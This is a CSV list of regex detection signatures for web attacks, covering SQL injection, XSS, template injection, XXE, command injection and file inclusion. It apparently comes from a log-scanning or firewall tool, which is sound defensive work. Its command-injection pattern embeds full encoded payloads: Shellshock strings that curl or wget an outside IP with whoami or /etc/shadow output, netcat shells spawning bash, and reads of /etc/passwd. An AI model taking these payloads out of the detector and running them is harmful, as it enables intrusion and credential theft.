attack_name,attack_query
[SQL INJECTION] SQL statement keywords detected,(SELECT|FROM(\+|%20)dual|INSERT|UPDATE|DROP|COLLATE|CASE|SUBSTR|SUBSTRING|NULL|ORDER(\+|%20)BY|UNION(\+|%20)(ALL)?).+(--(\+|%20)|%23)?
[SQL INJECTION] Database enumeration,v$version|v$instance|@@version|version\(\)|all_tables|all_tab_columns|information_schema.tables|information_schema.columns
[SQL INJECTION] Time delay attack,pg_sleep|sleep|dbms_pipe\.receive_message|WAITFOR(\+|%20)DELAY
[SQL INJECTION] Popular conditional error method detection,1\/0
[SQL INJECTION] Popular SQL Functions keywords detected,ASCII|CONCAT|CHAR|HEX
[SQL INJECTION] Bypass techniques (non-whitespace) detected,\/\*.*?\*\/|%0b
[SQL INJECTION] Single-encoded keywords detected,(%53%45%4C%45%43%54|%49%4E%53%45%52%54|%55%50%44%41%54%45|%44%45%4C%45%54%45|%43%4F%4C%4C%41%54%45|%43%41%53%45|%53%55%42%53%54%52|%53%55%42%53%54%52%49%4E%47|%4E%55%4C%4C|%4F%52%44%45%52%20%42%59|%55%4E%49%4F%4E|%55%4E%49%4F%4E%20%41%4C%4C|%46%52%4F%4D%20%64%75%61%6C)
[SQL INJECTION] Double-encoded keywords detected,(%2553%2545%254C%2545%2543%2554|%2549%254E%2553%2545%2552%2554|%2555%2550%2544%2541%2554%2545|%2544%2545%254C%2545%2554%2545|%2543%254F%254C%254C%2541%2554%2545|%2543%2541%2553%2545|%2553%2555%2542%2553%2554%2552|%2553%2555%2542%2553%2554%2552%2549%254E%2547|%254E%2555%254C%254C|%254F%2552%2544%2545%2552%2520%2542%2559|%2555%254E%2549%254F%254E|%2555%254E%2549%254F%254E%2520%2541%254C%254C|%2546%2552%254F%254D%2520%2564%2575%2561%256C)
[SQL INJECTION] Unicode-encoded keywords detected,(%u0053%u0045%u004C%u0045%u0043%u0054|%u0049%u004E%u0053%u0045%u0052%u0054|%u0055%u0050%u0044%u0041%u0054%u0045|%u0044%u0045%u004C%u0045%u0054%u0045|%u0043%u004F%u004C%u004C%u0041%u0054%u0045|%u0043%u0041%u0053%u0045|%u0053%u0055%u0042%u0053%u0054%u0052|%u0053%u0055%u0042%u0053%u0054%u0052%u0049%u004E%u0047|%u004E%u0055%u004C%u004C|%u004F%u0052%u0044%u0045%u0052%u0020%u0042%u0059|%u0055%u004E%u0049%u004F%u004E|%u0055%u004E%u0049%u004F%u004E%u0020%u0041%u004C%u004C|%u0046%u0052%u004F%u004D%u0020%u0064%u0075%u0061%u006C)
[SQL INJECTION] Char unicode escape (SQLMap tamper script) detected,(%5Cu0053%5Cu0045%5Cu004C%5Cu0045%5Cu0043%5Cu0054|%5Cu0049%5Cu004E%5Cu0053%5Cu0045%5Cu0052%5Cu0054|%5Cu0055%5Cu0050%5Cu0044%5Cu0041%5Cu0054%5Cu0045|%5Cu0044%5Cu0045%5Cu004C%5Cu0045%5Cu0054%5Cu0045|%5Cu0043%5Cu004F%5Cu004C%5Cu004C%5Cu0041%5Cu0054%5Cu0045|%5Cu0043%5Cu0041%5Cu0053%5Cu0045|%5Cu0053%5Cu0055%5Cu0042%5Cu0053%5Cu0054%5Cu0052|%5Cu0053%5Cu0055%5Cu0042%5Cu0053%5Cu0054%5Cu0052%5Cu0049%5Cu004E%5Cu0047|%5Cu004E%5Cu0055%5Cu004C%5Cu004C|%5Cu004F%5Cu0052%5Cu0044%5Cu0045%5Cu0052%5Cu0020%5Cu0042%5Cu0059|%5Cu0055%5Cu004E%5Cu0049%5Cu004F%5Cu004E|%5Cu0055%5Cu004E%5Cu0049%5Cu004F%5Cu004E%5Cu0020%5Cu0041%5Cu004C%5Cu004C|%5Cu0046%5Cu0052%5Cu004F%5Cu004D%5Cu0020%5Cu0064%5Cu0075%5Cu0061%5Cu006C)
[SQL INJECTION] Overlong UTF8 (SQLMap tamper script) detected,(%C1%93%C1%85%C1%8C%C1%85%C1%83%C1%94|%C1%89%C1%8E%C1%93%C1%85%C1%92%C1%94|%C1%95%C1%90%C1%84%C1%81%C1%94%C1%85|%C1%84%C1%85%C1%8C%C1%85%C1%94%C1%85|%C1%83%C1%8F%C1%8C%C1%8C%C1%81%C1%94%C1%85|%C1%83%C1%81%C1%93%C1%85|%C1%93%C1%95%C1%82%C1%93%C1%94%C1%92|%C1%93%C1%95%C1%82%C1%93%C1%94%C1%92%C1%89%C1%8E%C1%87|%C1%8E%C1%95%C1%8C%C1%8C|%C1%8F%C1%92%C1%84%C1%85%C1%92%C0%A0%C1%82%C1%99|%C1%95%C1%8E%C1%89%C1%8F%C1%8E|%C1%95%C1%8E%C1%89%C1%8F%C1%8E%C0%A0%C1%81%C1%8C%C1%8C|%C1%86%C1%92%C1%8F%C1%8D%C0%A0%C1%A4%C1%B5%C1%A1%C1%AC)
[SQL INJECTION] SQLMap --os-shell signatures,(INTO%20OUTFILE|INTO%20DUMPFILE|LOAD_FILE)
[XSS] Testing for vuln,(javascript:)?alert\(
[XSS] Frequently seen tags,%3C(script|iframe|img%20src)
[XSS] Frequently seen event handlers,onactivate|onafterscriptexecute|onanimationcancel|onanimationend|onanimationiteration|onbeforeactivate|onbeforedeactivate|onbeforeprint|onbeforescriptexecute|onbeforeunload|onbegin|onblur|onbounce|oncanplay|oncanplaythrough|oncuechange|ondeactivate|ondurationchange|onend|onended|onerror|onfinish|onfocus|onfocusin|onfocusout|onhashchange|onload|onloadeddata|onloadedmetadata|onloadend|onloadstart|onmessage|onpageshow|onplay|onplaying|onpopstate|onprogress|onreadystatechange|onrepeat|onresize|onscroll|onstart|ontimeupdate|ontoggle|ontransitioncancel|ontransitionend|ontransitionrun|ontransitionstart|onunhandledrejection|onunload|onwaiting|onwebkitanimationend|onwebkitanimationiteration|onwebkitanimationstart|onwebkittransitionend|onafterprint|onauxclick|onbeforecopy|onbeforecut|onbeforepaste|onchange|onclick|onclose|oncontextmenu|oncopy|oncut|ondblclick|ondrag|ondragend|ondragenter|ondragleave|ondragover|ondragstart|ondrop|onfullscreenchange|oninput|oninvalid|onkeydown|onkeypress|onkeyup|onmousedown|onmouseenter|onmouseleave|onmousemove|onmouseout|onmouseover|onmouseup|onmousewheel|onmozfullscreenchange|onpagehide|onpaste|onpause|onpointerdown|onpointerenter|onpointerleave|onpointermove|onpointerout|onpointerover|onpointerrawupdate|onpointerup|onreset|onsearch|onseeked|onseeking|onselect|onselectionchange|onselectstart|onshow|onsubmit|ontouchend|ontouchmove|ontouchstart|onvolumechange|onwheel
[XSS] Cookie theft,document\.cookie
[SSTI] Common fuzzing technique,(%7B|%24|%23|%3C%25%3D)+(\+|%20)?\d+(\+|%20)?\*(\+|%20)?\d+(\+|%20)?(%25%3E|%7D)+
[SSTI] Twig Template Version enumeration,%7B%7Bconstant%28%27+Twig_Environment%3A%3AVERSION+%27%29%7D%7D
[SSTI] Twig Template Code Execution,registerUndefinedFilterCallback.+exec|system
[SSTI] Twig Template Remote File Include Code Execution,setCache\(.+\).+loadTemplate\(.+\)
[SSTI] Freemaker Template Code Execution,freemarker\.template\.utility\.Execute
[SSTI] Velocity/Pebble/Thymeleaf Template Code Execution,getRuntime%28%29\.exec
[SSTI] Smarty Template Read File,getStreamVariable%28.+%29
[SSTI] Smarty Template Write File,Smarty_Internal_Write_File%3A%3AwriteFile
[SSTI] Pebble (New version) Template Code Execution,forName%28%27java.lang.Runtime%27%29(\n|.)+\.exec
[SSTI] Jade Template Code Execution,var%20(.+)%20?=(\n|.)+\1\.exec
[SSTI] PugJS Template Code Execution,localLoad%28%22child_process%22%29.exec
[SSTI] Nunjucks Template Code Execution,require%28%27child_process%27%29.execSync
[SSTI] Tornado Template Code Execution,import%20os%20(\n|.)+os\.system
[SSTI] Razor Template Code Execution,System\.Diagnostics\.Process\.Start
[SSTI] ASP Template Code Execution,CreateObject%28%22Wscript\.Shell%22%29\.exec
[XXE] External entity attack,ENTITY.+SYSTEM
[XXE] XInclude attack,XInclude.+xi.+include
[XXE] Billion Laugh Attack (DoS),ENTITY%20(.+)%20.+\n.*&\1
[XXE] YAML attack (DoS),&(.+).+\n.+\*\1
[COMMAND INJECTION] Inline Command Execution,(\$\()(.*)(\))|(%24%28)(.*)(%29)|`(.*)`|(%60)(.*)(%60)
[COMMAND INJECTION] IFS Space Bypass ,(\$IFS)|(\${IFS})|(IFS=)|(%24IFS)|(%24%7BIFS%7D)|(IFS%3D)
[COMMAND INJECTION] Uninitialised Variable Bypass,(\$u)|(%24u)|(\${u})|(%24%7Bu%7D)
[COMMAND INJECTION] Command Chaining,(%3B)|(&&)|(%26)|(%26%26)|\||(\|\|)|(%7C)|(%7C%7C)
[COMMAND INJECTION] Common UNIX Payloads,(%26lt%3B%21--%23exec%2520cmd%3D%26quot%3B)|(%2Findex.html%7Cid%7C)|(%28%29\+%7B\+%3A%3B%7D%3B\+%2Fbin%2Fbash\+-c)|(%26lt%3B%21--%23exec%2520cmd%3D%26quot%3B%2Fbin%2Fcat%2520%2Fetc%2Fpasswd%26quot%3B--%26gt%3B%0A)(%26lt%3B%21--%23exec%2520cmd%3D%26quot%3B%2Fbin%2Fcat%2520%2Fetc%2Fshadow%26quot%3B--%26gt%3B%0A)|(%26lt%3B%21--%23exec%2520cmd%3D%26quot%3B%2Fbin%2Fcat%2520%2Fetc%2Fshadow%26quot%3B--%26gt%3B%0A)(%26lt%3B%21--%23exec%2520cmd%3D%26quot%3B%2Fusr%2Fbin%2Fid%3B--%26gt%3B%0A)|(%26lt%3B%21--%23exec%2520cmd%3D%26quot%3B%2Fusr%2Fbin%2Fid%3B--%26gt%3B%0A)(%26lt%3B%21--%23exec%2520cmd%3D%26quot%3B%2Fusr%2Fbin%2Fid%3B--%26gt%3B%0A)|(%26lt%3B%21--%23exec%2520cmd%3D%26quot%3B%2Fusr%2Fbin%2Fid%3B--%26gt%3B%0A)(%2Findex.html%7Cid%7C%0A)|(%2Findex.html%7Cid%7C%0A)(%3Bid%3B%0A)|(%3Bid%3B%0A)(%3Bid%0A)|(%3Bid%0A)(%3Bnetstat+-a%3B%0A)|(%3Bnetstat+-a%3B%0A)(%3Bsystem%28%27cat%2520%2Fetc%2Fpasswd%27%29%0A)|(%3Bsystem%28%27cat%2520%2Fetc%2Fpasswd%27%29%0A)(%3Bid%3B%0A)|(%3Bid%3B%0A)(%7Cid%0A)|(%7Cid%0A)(%7C%2Fusr%2Fbin%2Fid%0A)|(%7C%2Fusr%2Fbin%2Fid%0A)(%7Cid%7C%0A)|(%7Cid%7C%0A)(%7C%2Fusr%2Fbin%2Fid%7C%0A)|(%7C%2Fusr%2Fbin%2Fid%7C%0A)(%7C%7C%2Fusr%2Fbin%2Fid%7C%0A)|(%7C%7C%2Fusr%2Fbin%2Fid%7C%0A)(%7Cid%3B%0A)|(%7Cid%3B%0A)(%7C%7C%2Fusr%2Fbin%2Fid%3B%0A)|(%7C%7C%2Fusr%2Fbin%2Fid%3B%0A)(%3Bid%7C%0A)|(%3Bid%7C%0A)(%3B%7C%2Fusr%2Fbin%2Fid%7C%0A)|(%3B%7C%2Fusr%2Fbin%2Fid%7C%0A)(%5Cn%2Fbin%2Fls+-al%5Cn%0A)|(%5Cn%2Fbin%2Fls+-al%5Cn%0A)(%5Cn%2Fusr%2Fbin%2Fid%5Cn%0A)|(%5Cn%2Fusr%2Fbin%2Fid%5Cn%0A)(%5Cnid%5Cn%0A)|(%5Cnid%5Cn%0A)(%5Cn%2Fusr%2Fbin%2Fid%3B%0A)|(%5Cn%2Fusr%2Fbin%2Fid%3B%0A)(%5Cnid%3B%0A)|(%5Cnid%3B%0A)(%5Cn%2Fusr%2Fbin%2Fid%7C%0A)|(%5Cn%2Fusr%2Fbin%2Fid%7C%0A)(%5Cnid%7C%0A)|(%5Cnid%7C%0A)(%3B%2Fusr%2Fbin%2Fid%5Cn%0A)|(%3B%2Fusr%2Fbin%2Fid%5Cn%0A)(%3Bid%5Cn%0A)|(%3Bid%5Cn%0A)(%7Cusr%2Fbin%2Fid%5Cn%0A)|(%7Cusr%2Fbin%2Fid%5Cn%0A)(%7Cnid%5Cn%0A)|(%7Cnid%5Cn%0A)(%60id%60%0A)|(%60id%60%0A)(%60%2Fusr%2Fbin%2Fid%60%0A)|(%60%2Fusr%2Fbin%2Fid%60%0A)(a%29%3Bid%0A)|(a%29%3Bid%0A)(a%3Bid%0A)|(a%3Bid%0A)(a%29%3Bid%3B%0A)|(a%29%3Bid%3B%0A)(a%3Bid%3B%0A)|(a%3Bid%3B%0A)(a%29%3Bid%7C%0A)|(a%29%3Bid%7C%0A)(a%3Bid%7C%0A)|(a%3Bid%7C%0A)(a%29%7Cid%0A)|(a%29%7Cid%0A)(a%7Cid%0A)|(a%7Cid%0A)(a%29%7Cid%3B%0A)|(a%29%7Cid%3B%0A)(a%7Cid%0A)|(a%7Cid%0A)(%7C%2Fbin%2Fls+-al%0A)|(%7C%2Fbin%2Fls+-al%0A)(a%29%3B%2Fusr%2Fbin%2Fid%0A)|(a%29%3B%2Fusr%2Fbin%2Fid%0A)(a%3B%2Fusr%2Fbin%2Fid%0A)|(a%3B%2Fusr%2Fbin%2Fid%0A)(a%29%3B%2Fusr%2Fbin%2Fid%3B%0A)|(a%29%3B%2Fusr%2Fbin%2Fid%3B%0A)(a%3B%2Fusr%2Fbin%2Fid%3B%0A)|(a%3B%2Fusr%2Fbin%2Fid%3B%0A)(a%29%3B%2Fusr%2Fbin%2Fid%7C%0A)|(a%29%3B%2Fusr%2Fbin%2Fid%7C%0A)(a%3B%2Fusr%2Fbin%2Fid%7C%0A)|(a%3B%2Fusr%2Fbin%2Fid%7C%0A)(a%29%7C%2Fusr%2Fbin%2Fid%0A)|(a%29%7C%2Fusr%2Fbin%2Fid%0A)(a%7C%2Fusr%2Fbin%2Fid%0A)|(a%7C%2Fusr%2Fbin%2Fid%0A)(a%29%7C%2Fusr%2Fbin%2Fid%3B%0A)|(a%29%7C%2Fusr%2Fbin%2Fid%3B%0A)(a%7C%2Fusr%2Fbin%2Fid%0A)|(a%7C%2Fusr%2Fbin%2Fid%0A)(%3Bsystem%28%27cat%2520%2Fetc%2Fpasswd%27%29%0A)|(%3Bsystem%28%27cat%2520%2Fetc%2Fpasswd%27%29%0A)(%3Bsystem%28%27id%27%29%0A)|(%3Bsystem%28%27id%27%29%0A)(%3Bsystem%28%27%2Fusr%2Fbin%2Fid%27%29%0A)|(%3Bsystem%28%27%2Fusr%2Fbin%2Fid%27%29%0A)(%250Acat%2520%2Fetc%2Fpasswd%0A)|(%250Acat%2520%2Fetc%2Fpasswd%0A)(%250A%2Fusr%2Fbin%2Fid%0A)|(%250A%2Fusr%2Fbin%2Fid%0A)(%250Aid%0A)|(%250Aid%0A)(%250A%2Fusr%2Fbin%2Fid%250A%0A)|(%250A%2Fusr%2Fbin%2Fid%250A%0A)(%250Aid%250A%0A)|(%250Aid%250A%0A)(%26+ping+-i+30+127.0.0.1+%26%0A)|(%26+ping+-i+30+127.0.0.1+%26%0A)(%26+ping+-n+30+127.0.0.1+%26%0A)|(%26+ping+-n+30+127.0.0.1+%26%0A)(%250a+ping+-i+30+127.0.0.1+%250a%0A)|(%250a+ping+-i+30+127.0.0.1+%250a%0A)(%60ping+127.0.0.1%60%0A)|(%60ping+127.0.0.1%60%0A)(%7C+id%0A)|(%7C+id%0A)(%26+id%0A)|(%26+id%0A)(%3B+id%0A)|(%3B+id%0A)(%250a+id+%250a%0A)|(%250a+id+%250a%0A)(%60id%60%0A)|(%60id%60%0A)(%24%3B%2Fusr%2Fbin%2Fid%0A)|(%24%3B%2Fusr%2Fbin%2Fid%0A)(%28%29+%7B+%3A%3B%7D%3B+%2Fbin%2Fbash+-c+%22curl+http%3A%2F%2F135.23.158.130%2F.testing%2Fshellshock.txt%3Fvuln%3D16%3Fuser%3D%5C%60whoami%5C%60%22%0A)|(%28%29+%7B+%3A%3B%7D%3B+%2Fbin%2Fbash+-c+%22curl+http%3A%2F%2F135.23.158.130%2F.testing%2Fshellshock.txt%3Fvuln%3D16%3Fuser%3D%5C%60whoami%5C%60%22%0A)(%28%29+%7B+%3A%3B%7D%3B+%2Fbin%2Fbash+-c+%22curl+http%3A%2F%2F135.23.158.130%2F.testing%2Fshellshock.txt%3Fvuln%3D18%3Fpwd%3D%5C%60pwd%5C%60%22%0A)|(%28%29+%7B+%3A%3B%7D%3B+%2Fbin%2Fbash+-c+%22curl+http%3A%2F%2F135.23.158.130%2F.testing%2Fshellshock.txt%3Fvuln%3D18%3Fpwd%3D%5C%60pwd%5C%60%22%0A)(%28%29+%7B+%3A%3B%7D%3B+%2Fbin%2Fbash+-c+%22curl+http%3A%2F%2F135.23.158.130%2F.testing%2Fshellshock.txt%3Fvuln%3D20%3Fshadow%3D%5C%60grep+root+%2Fetc%2Fshadow%5C%60%22%0A)|(%28%29+%7B+%3A%3B%7D%3B+%2Fbin%2Fbash+-c+%22curl+http%3A%2F%2F135.23.158.130%2F.testing%2Fshellshock.txt%3Fvuln%3D20%3Fshadow%3D%5C%60grep+root+%2Fetc%2Fshadow%5C%60%22%0A)(%28%29+%7B+%3A%3B%7D%3B+%2Fbin%2Fbash+-c+%22curl+http%3A%2F%2F135.23.158.130%2F.testing%2Fshellshock.txt%3Fvuln%3D22%3Funame%3D%5C%60uname+-a%5C%60%22%0A)|(%28%29+%7B+%3A%3B%7D%3B+%2Fbin%2Fbash+-c+%22curl+http%3A%2F%2F135.23.158.130%2F.testing%2Fshellshock.txt%3Fvuln%3D22%3Funame%3D%5C%60uname+-a%5C%60%22%0A)(%28%29+%7B+%3A%3B%7D%3B+%2Fbin%2Fbash+-c+%22curl+http%3A%2F%2F135.23.158.130%2F.testing%2Fshellshock.txt%3Fvuln%3D24%3Fshell%3D%5C%60nc+-lvvp+1234+-e+%2Fbin%2Fbash%5C%60%22%0A)|(%28%29+%7B+%3A%3B%7D%3B+%2Fbin%2Fbash+-c+%22curl+http%3A%2F%2F135.23.158.130%2F.testing%2Fshellshock.txt%3Fvuln%3D24%3Fshell%3D%5C%60nc+-lvvp+1234+-e+%2Fbin%2Fbash%5C%60%22%0A)(%28%29+%7B+%3A%3B%7D%3B+%2Fbin%2Fbash+-c+%22curl+http%3A%2F%2F135.23.158.130%2F.testing%2Fshellshock.txt%3Fvuln%3D26%3Fshell%3D%5C%60nc+-lvvp+1236+-e+%2Fbin%2Fbash+%26%5C%60%22%0A)|(%28%29+%7B+%3A%3B%7D%3B+%2Fbin%2Fbash+-c+%22curl+http%3A%2F%2F135.23.158.130%2F.testing%2Fshellshock.txt%3Fvuln%3D26%3Fshell%3D%5C%60nc+-lvvp+1236+-e+%2Fbin%2Fbash+%26%5C%60%22%0A)(%28%29+%7B+%3A%3B%7D%3B+%2Fbin%2Fbash+-c+%22curl+http%3A%2F%2F135.23.158.130%2F.testing%2Fshellshock.txt%3Fvuln%3D5%22%0A)|(%28%29+%7B+%3A%3B%7D%3B+%2Fbin%2Fbash+-c+%22curl+http%3A%2F%2F135.23.158.130%2F.testing%2Fshellshock.txt%3Fvuln%3D5%22%0A)(%28%29+%7B+%3A%3B%7D%3B+%2Fbin%2Fbash+-c+%22sleep+1+%26%26+curl+http%3A%2F%2F135.23.158.130%2F.testing%2Fshellshock.txt%3Fsleep%3D1%26%3Fvuln%3D6%22%0A)|(%28%29+%7B+%3A%3B%7D%3B+%2Fbin%2Fbash+-c+%22sleep+1+%26%26+curl+http%3A%2F%2F135.23.158.130%2F.testing%2Fshellshock.txt%3Fsleep%3D1%26%3Fvuln%3D6%22%0A)(%28%29+%7B+%3A%3B%7D%3B+%2Fbin%2Fbash+-c+%22sleep+1+%26%26+echo+vulnerable+1%22%0A)|(%28%29+%7B+%3A%3B%7D%3B+%2Fbin%2Fbash+-c+%22sleep+1+%26%26+echo+vulnerable+1%22%0A)(%28%29+%7B+%3A%3B%7D%3B+%2Fbin%2Fbash+-c+%22sleep+3+%26%26+curl+http%3A%2F%2F135.23.158.130%2F.testing%2Fshellshock.txt%3Fsleep%3D3%26%3Fvuln%3D7%22%0A)|(%28%29+%7B+%3A%3B%7D%3B+%2Fbin%2Fbash+-c+%22sleep+3+%26%26+curl+http%3A%2F%2F135.23.158.130%2F.testing%2Fshellshock.txt%3Fsleep%3D3%26%3Fvuln%3D7%22%0A)(%28%29+%7B+%3A%3B%7D%3B+%2Fbin%2Fbash+-c+%22sleep+3+%26%26+echo+vulnerable+3%22%0A)|(%28%29+%7B+%3A%3B%7D%3B+%2Fbin%2Fbash+-c+%22sleep+3+%26%26+echo+vulnerable+3%22%0A)(%28%29+%7B+%3A%3B%7D%3B+%2Fbin%2Fbash+-c+%22sleep+6+%26%26+curl+http%3A%2F%2F135.23.158.130%2F.testing%2Fshellshock.txt%3Fsleep%3D6%26%3Fvuln%3D8%22%0A)|(%28%29+%7B+%3A%3B%7D%3B+%2Fbin%2Fbash+-c+%22sleep+6+%26%26+curl+http%3A%2F%2F135.23.158.130%2F.testing%2Fshellshock.txt%3Fsleep%3D6%26%3Fvuln%3D8%22%0A)(%28%29+%7B+%3A%3B%7D%3B+%2Fbin%2Fbash+-c+%22sleep+6+%26%26+curl+http%3A%2F%2F135.23.158.130%2F.testing%2Fshellshock.txt%3Fsleep%3D9%26%3Fvuln%3D9%22%0A)|(%28%29+%7B+%3A%3B%7D%3B+%2Fbin%2Fbash+-c+%22sleep+6+%26%26+curl+http%3A%2F%2F135.23.158.130%2F.testing%2Fshellshock.txt%3Fsleep%3D9%26%3Fvuln%3D9%22%0A)(%28%29+%7B+%3A%3B%7D%3B+%2Fbin%2Fbash+-c+%22sleep+6+%26%26+echo+vulnerable+6%22%0A)|(%28%29+%7B+%3A%3B%7D%3B+%2Fbin%2Fbash+-c+%22sleep+6+%26%26+echo+vulnerable+6%22%0A)(%28%29+%7B+%3A%3B%7D%3B+%2Fbin%2Fbash+-c+%22wget+http%3A%2F%2F135.23.158.130%2F.testing%2Fshellshock.txt%3Fvuln%3D17%3Fuser%3D%5C%60whoami%5C%60%22%0A)|(%28%29+%7B+%3A%3B%7D%3B+%2Fbin%2Fbash+-c+%22wget+http%3A%2F%2F135.23.158.130%2F.testing%2Fshellshock.txt%3Fvuln%3D17%3Fuser%3D%5C%60whoami%5C%60%22%0A)(%28%29+%7B+%3A%3B%7D%3B+%2Fbin%2Fbash+-c+%22wget+http%3A%2F%2F135.23.158.130%2F.testing%2Fshellshock.txt%3Fvuln%3D19%3Fpwd%3D%5C%60pwd%5C%60%22%0A)|(%28%29+%7B+%3A%3B%7D%3B+%2Fbin%2Fbash+-c+%22wget+http%3A%2F%2F135.23.158.130%2F.testing%2Fshellshock.txt%3Fvuln%3D19%3Fpwd%3D%5C%60pwd%5C%60%22%0A)(%28%29+%7B+%3A%3B%7D%3B+%2Fbin%2Fbash+-c+%22wget+http%3A%2F%2F135.23.158.130%2F.testing%2Fshellshock.txt%3Fvuln%3D21%3Fshadow%3D%5C%60grep+root+%2Fetc%2Fshadow%5C%60%22%0A)|(%28%29+%7B+%3A%3B%7D%3B+%2Fbin%2Fbash+-c+%22wget+http%3A%2F%2F135.23.158.130%2F.testing%2Fshellshock.txt%3Fvuln%3D21%3Fshadow%3D%5C%60grep+root+%2Fetc%2Fshadow%5C%60%22%0A)(%28%29+%7B+%3A%3B%7D%3B+%2Fbin%2Fbash+-c+%22wget+http%3A%2F%2F135.23.158.130%2F.testing%2Fshellshock.txt%3Fvuln%3D23%3Funame%3D%5C%60uname+-a%5C%60%22%0A)|(%28%29+%7B+%3A%3B%7D%3B+%2Fbin%2Fbash+-c+%22wget+http%3A%2F%2F135.23.158.130%2F.testing%2Fshellshock.txt%3Fvuln%3D23%3Funame%3D%5C%60uname+-a%5C%60%22%0A)(%28%29+%7B+%3A%3B%7D%3B+%2Fbin%2Fbash+-c+%22wget+http%3A%2F%2F135.23.158.130%2F.testing%2Fshellshock.txt%3Fvuln%3D25%3Fshell%3D%5C%60nc+-lvvp+1235+-e+%2Fbin%2Fbash%5C%60%22%0A)|(%28%29+%7B+%3A%3B%7D%3B+%2Fbin%2Fbash+-c+%22wget+http%3A%2F%2F135.23.158.130%2F.testing%2Fshellshock.txt%3Fvuln%3D25%3Fshell%3D%5C%60nc+-lvvp+1235+-e+%2Fbin%2Fbash%5C%60%22%0A)(%28%29+%7B+%3A%3B%7D%3B+%2Fbin%2Fbash+-c+%22wget+http%3A%2F%2F135.23.158.130%2F.testing%2Fshellshock.txt%3Fvuln%3D27%3Fshell%3D%5C%60nc+-lvvp+1237+-e+%2Fbin%2Fbash+%26%5C%60%22%0A)|(%28%29+%7B+%3A%3B%7D%3B+%2Fbin%2Fbash+-c+%22wget+http%3A%2F%2F135.23.158.130%2F.testing%2Fshellshock.txt%3Fvuln%3D27%3Fshell%3D%5C%60nc+-lvvp+1237+-e+%2Fbin%2Fbash+%26%5C%60%22%0A)(%28%29+%7B+%3A%3B%7D%3B+%2Fbin%2Fbash+-c+%22wget+http%3A%2F%2F135.23.158.130%2F.testing%2Fshellshock.txt%3Fvuln%3D4%22%0A)|(%28%29+%7B+%3A%3B%7D%3B+%2Fbin%2Fbash+-c+%22wget+http%3A%2F%2F135.23.158.130%2F.testing%2Fshellshock.txt%3Fvuln%3D4%22%0A)(cat+%2Fetc%2Fhosts%0A)|(cat+%2Fetc%2Fhosts%0A)(%24%28%60cat+%2Fetc%2Fpasswd%60%29%0A)|(%24%28%60cat+%2Fetc%2Fpasswd%60%29%0A)(cat+%2Fetc%2Fpasswd%0A)|(cat+%2Fetc%2Fpasswd%0A)(%250Acat%2520%2Fetc%2Fpasswd%0A)|(%250Acat%2520%2Fetc%2Fpasswd%0A)(%7B%7B+get_user_file%28%22%2Fetc%2Fpasswd%22%29+%7D%7D%0A)|(%7B%7B+get_user_file%28%22%2Fetc%2Fpasswd%22%29+%7D%7D%0A)(%3C%21--%23exec+cmd%3D%22%2Fbin%2Fcat+%2Fetc%2Fpasswd%22--%3E%0A)|(%3C%21--%23exec+cmd%3D%22%2Fbin%2Fcat+%2Fetc%2Fpasswd%22--%3E%0A)(%3C%21--%23exec+cmd%3D%22%2Fbin%2Fcat+%2Fetc%2Fshadow%22--%3E%0A)|(%3C%21--%23exec+cmd%3D%22%2Fbin%2Fcat+%2Fetc%2Fshadow%22--%3E%0A)(%3C%21--%23exec+cmd%3D%22%2Fusr%2Fbin%2Fid%3B--%3E%0A)|(%3C%21--%23exec+cmd%3D%22%2Fusr%2Fbin%2Fid%3B--%3E%0A)(system%28%27cat+%2Fetc%2Fpasswd%27%29%3B%0A)|(system%28%27cat+%2Fetc%2Fpasswd%27%29%3B%0A)(%3C%3Fphp+system%28%22cat+%2Fetc%2Fpasswd%22%29%3B%3F%3E)|(%3C%3Fphp+system%28%22cat+%2Fetc%2Fpasswd%22%29%3B%3F%3E)
[LOCAL FILE INCLUSION] Possible Directory Traversal,\.\.\/|\/etc\/passwd|file:\/\/|=\/
[LOCAL FILE INCLUSION] Arbitrary Code Execution,\(\$\_GET\[\'cmd\'\]\)\;\?\>|input\&cmd|filter\/resource|cmd=
[LOCAL FILE INCLUSION] Possible Arbitrary Code Execution Encoded in Base64,base64_decode
[LOCAL FILE INCLUSION] PHP Code Execution Commands detected,shell_exec|passthru\(
[FILE UPLOAD] Masking PHP file with .jpg,\.php\.jpg
[REMOTE FILE INCLUSION] Possible Loading of URL into web-server,page=http|page=www|page=HTTP|page=WWW
[URL INDICATOR] Public IP address input detected possible malicious link,\b(?!(?:10\.|172\.(?:1[6-9]|2[0-9]|3[0-2])\.|192\.168\.))((?:(?:2(?:[0-4][0-9]|5[0-5])|[0-1]?[0-9]?[0-9])\.){3}(?:(?:2(?:[0-4][0-9]|5[0-5])|[0-1]?[0-9]?[0-9])))\b
[URL INDICATOR] URL input detected possible malicious link,"https?((:\/\/)|%3A%2F%2F)(www\.)?[-a-zA-Z0-9@:%._\+~#=]{2,256}\.[a-z]{2,4}\b([-a-zA-Z0-9@:%_\+.~#?&//=]*)"
